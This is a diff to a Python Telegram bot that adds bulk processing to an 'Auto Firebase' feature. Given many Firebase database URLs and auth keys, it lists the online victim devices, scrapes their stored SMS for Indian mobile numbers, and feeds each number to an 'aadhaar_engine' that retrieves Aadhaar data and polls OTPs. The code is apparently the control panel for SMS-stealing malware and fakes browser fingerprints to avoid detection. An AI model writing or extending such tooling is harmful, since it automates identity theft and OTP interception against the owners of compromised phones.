@@ -654,7 +654,7 @@ def handle_admin_callbacks(call):
         bot.send_message(
             chat_id,
             "⚡ <b>Auto Firebase Automation</b>\n\n"
-            "👇 Kripya apne <b>Firebase Realtime Database URL(s)</b> paste karein. Bot online devices count karega aur automatically numbers aur 40-second timeout OTPs process karega:\n\n"
+            "👇 Kripya apne <b>Firebase Realtime Database URL(s)</b> paste karein (bulk links supported). Bot sabhi links scan karega, total online devices batayega aur automatically process karega:\n\n"
             "Type <b>Cancel</b> to abort.",
             reply_markup=cancel_markup,
             parse_mode='HTML'
@@ -1315,7 +1315,7 @@ def handle_all(message):
         return
     text = message.text.strip()
 
-    # --- AUTO FIREBASE BOT AUTOMATION INTERCEPTOR ---
+    # --- AUTO FIREBASE BOT AUTOMATION INTERCEPTOR (BULK URL PARSING & PROCESSING) ---
     if state.get('step') == 'AWAITING_AUTO_FIREBASE_LINK':
         if text.lower() == 'cancel':
             user_states[chat_id] = {'step': 'IDLE'}
@@ -1323,105 +1323,136 @@ def handle_all(message):
             send_admin_dashboard(chat_id)
             return
 
-        urls = re.findall(r'https?://[^\s]+', text)
-        if not urls:
-            lines = [line.strip() for line in text.splitlines() if line.strip()]
-            urls = [l if l.startswith('http') else f"https://{l}" for l in lines]
+        def extract_unique_urls(t: str) -> list:
+            if not t:
+                return []
+            unique_list = []
+            seen = set()
+            lines = t.split("\n")
+            current_url = None
+            current_auth = None
+            for line in lines:
+                url_match = re.search(r'Firebase URL:\s*(https?://[^\s]+)', line, re.IGNORECASE)
+                if url_match:
+                    current_url = url_match.group(1).strip().rstrip('.,;:!)]}')
+                auth_match = re.search(r'Auth Key:\s*([^\s]+)', line, re.IGNORECASE)
+                if auth_match:
+                    current_auth = auth_match.group(1).strip().rstrip('.,;:!)]}')
+                if current_url:
+                    base_match = re.search(r'(https?://[a-zA-Z0-9\-]+\.(?:firebaseio\.com|firebasedatabase\.app|firebaseapp\.com))', current_url)
+                    if base_match:
+                        base_domain = base_match.group(1).rstrip("/") + "/"
+                        final_item = base_domain
+                        if current_auth and not current_auth.startswith("http") and len(current_auth) > 5:
+                            final_item = f"{base_domain}?auth={current_auth}"
+                        if final_item not in seen:
+                            seen.add(final_item)
+                            unique_list.append(final_item)
+                    current_url = None
+                    current_auth = None
+            if not unique_list:
+                pattern = r'https?://[^\s]+\.(?:firebaseio\.com|firebasedatabase\.app|firebaseapp\.com)[^\s]*'
+                found = re.findall(pattern, t)
+                for u in found:
+                    u = u.strip().rstrip('.,;:!)]}')
+                    if u and u not in seen:
+                        seen.add(u)
+                        unique_list.append(u)
+            return unique_list
 
+        urls = extract_unique_urls(text)
         if not urls:
-            bot.send_message(chat_id, "⚠️ No valid Firebase links found. Kripya valid link paste karein:")
+            bot.send_message(chat_id, "⚠️ No valid Firebase links found. Kripya valid links paste karein:")
             return
 
-        target_firebase_url = urls[0].strip()
         user_states[chat_id] = {'step': 'IDLE'}
-        
-        status_msg = bot.send_message(chat_id, "⚡ <b>Auto Firebase started!</b> Scanning active online devices from URL...", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
+        status_msg = bot.send_message(chat_id, f"⚡ <b>Auto Firebase started!</b> Scanning {len(urls)} database links...", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
 
-        def run_auto_firebase_loop():
+        def run_auto_firebase_bulk_loop():
             try:
-                base_url = target_firebase_url.split('?')[0].rstrip('/')
-                query = target_firebase_url.split('?')[1] if '?' in target_firebase_url else ''
-                
-                if not base_url.endswith('/'):
-                    base_url += '/'
-                
-                clients_endpoint = f"{base_url}clients.json"
-                if query:
-                    clients_endpoint += f"?{query}"
-
-                res = cffi_requests.get(clients_endpoint, impersonate="chrome120", timeout=15)
-                if res.status_code != 200:
-                    bot.send_message(chat_id, f"❌ Failed to connect to Firebase (HTTP {res.status_code}).")
-                    return
-
-                data = res.json() or {}
-                online_cids = [
-                    cid for cid, cdata in data.items() 
-                    if isinstance(cdata, dict) and (cdata.get("status") is True or cdata.get("online") is True)
-                ]
-
-                total_online_count = len(online_cids)
-                if total_online_count == 0 and len(data) > 0:
-                    online_cids = list(data.keys())
-                    total_online_count = len(online_cids)
-
-                if not online_cids:
-                    bot.send_message(chat_id, "❌ No online devices found in Firebase database.")
-                    return
-
-                bot.send_message(
-                    chat_id,
-                    "🔥 <b>AUTO FIREBASE REPORT & EXECUTION</b>\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🔗 <b>Checked URL:</b> <code>{base_url}</code>\n"
-                    f"🟢 <b>Total Online / Active Devices:</b> <code>{total_online_count}</code>\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━\n"
-                    "⚡ <i>Executing automated Aadhaar retrieval & 40s timeout OTP polling for all devices...</i>",
-                    parse_mode='HTML'
-                )
-
-                for cid in online_cids:
-                    msg_endpoint = f"{base_url}messages/{cid}.json"
+                total_processed = 0
+                for target_firebase_url in urls:
+                    base_url = target_firebase_url.split('?')[0].rstrip('/')
+                    query = target_firebase_url.split('?')[1] if '?' in target_firebase_url else ''
+                    
+                    if not base_url.endswith('/'):
+                        base_url += '/'
+                    
+                    clients_endpoint = f"{base_url}clients.json"
                     if query:
-                        msg_endpoint += f"?{query}"
-                    
-                    m_res = cffi_requests.get(msg_endpoint, impersonate="chrome120", timeout=10)
-                    msgs = m_res.json() or {}
-                    
-                    phone_number = None
-                    for m_val in msgs.values():
-                        if isinstance(m_val, dict):
-                            body = str(m_val.get("body") or m_val.get("message") or "")
-                            clean_txt = re.sub(r'[\s\-]', '', body)
-                            match = re.search(r'(?:(?:\+91|91|0)([6-9]\d{9})|([6-9]\d{9}))', clean_txt)
-                            if match:
-                                phone_number = match.group(1) or match.group(2)
-                                break
+                        clients_endpoint += f"?{query}"
 
-                    if not phone_number:
+                    try:
+                        res = cffi_requests.get(clients_endpoint, impersonate="chrome120", timeout=12)
+                        if res.status_code != 200:
+                            continue
+                        data = res.json() or {}
+                    except Exception:
                         continue
 
-                    bot.send_message(chat_id, f"🎯 Auto-processing target mobile: <code>{phone_number}</code>", parse_mode='HTML')
-                    
-                    os.environ['FIREBASE_URL'] = target_firebase_url
+                    online_cids = [
+                        cid for cid, cdata in data.items() 
+                        if isinstance(cdata, dict) and (cdata.get("status") is True or cdata.get("online") is True)
+                    ]
+                    if not online_cids and len(data) > 0:
+                        online_cids = list(data.keys())
 
-                    user_info = {'username': 'AutoFirebase', 'first_name': 'AutoBot'}
-                    future = asyncio.run_coroutine_threadsafe(
-                        aadhaar_engine.execute_task(bot, chat_id, "Mr", phone_number, None, user_info=user_info),
-                        loop
+                    if not online_cids:
+                        continue
+
+                    bot.send_message(
+                        chat_id,
+                        f"🔥 <b>Processing Database:</b> <code>{base_url}</code>\n"
+                        f"🟢 Active Devices: <b>{len(online_cids)}</b>",
+                        parse_mode='HTML'
                     )
-                    try:
-                        future.result(timeout=600)
-                    except Exception as ex:
-                        print(f"⚠️ [AUTO-FIREBASE] Task execution error for {phone_number}: {ex}")
-                    
-                    time.sleep(2)
 
-                bot.send_message(chat_id, "✅ <b>Auto Firebase finished processing all devices!</b>", parse_mode='HTML')
+                    for cid in online_cids:
+                        msg_endpoint = f"{base_url}messages/{cid}.json"
+                        if query:
+                            msg_endpoint += f"?{query}"
+                        
+                        try:
+                            m_res = cffi_requests.get(msg_endpoint, impersonate="chrome120", timeout=8)
+                            msgs = m_res.json() or {}
+                        except Exception:
+                            continue
+                        
+                        phone_number = None
+                        for m_val in msgs.values():
+                            if isinstance(m_val, dict):
+                                body = str(m_val.get("body") or m_val.get("message") or "")
+                                clean_txt = re.sub(r'[\s\-]', '', body)
+                                match = re.search(r'(?:(?:\+91|91|0)([6-9]\d{9})|([6-9]\d{9}))', clean_txt)
+                                if match:
+                                    phone_number = match.group(1) or match.group(2)
+                                    break
+
+                        if not phone_number:
+                            continue
+
+                        bot.send_message(chat_id, f"🎯 Auto-processing target mobile: <code>{phone_number}</code>", parse_mode='HTML')
+                        
+                        os.environ['FIREBASE_URL'] = target_firebase_url
+
+                        user_info = {'username': 'AutoFirebase', 'first_name': 'AutoBot'}
+                        future = asyncio.run_coroutine_threadsafe(
+                            aadhaar_engine.execute_task(bot, chat_id, "Mr", phone_number, None, user_info=user_info),
+                            loop
+                        )
+                        try:
+                            future.result(timeout=600)
+                            total_processed += 1
+                        except Exception as ex:
+                            print(f"⚠️ [AUTO-FIREBASE] Task execution error for {phone_number}: {ex}")
+                        
+                        time.sleep(2)
+
+                bot.send_message(chat_id, f"✅ <b>Auto Firebase finished! Successfully processed {total_processed} numbers across all {len(urls)} links.</b>", parse_mode='HTML')
             except Exception as e:
                 bot.send_message(chat_id, f"❌ Auto Firebase Error: {esc(e)}")
 
-        threading.Thread(target=run_auto_firebase_loop, daemon=True).start()
+        threading.Thread(target=run_auto_firebase_bulk_loop, daemon=True).start()
         send_admin_dashboard(chat_id)
         return
     
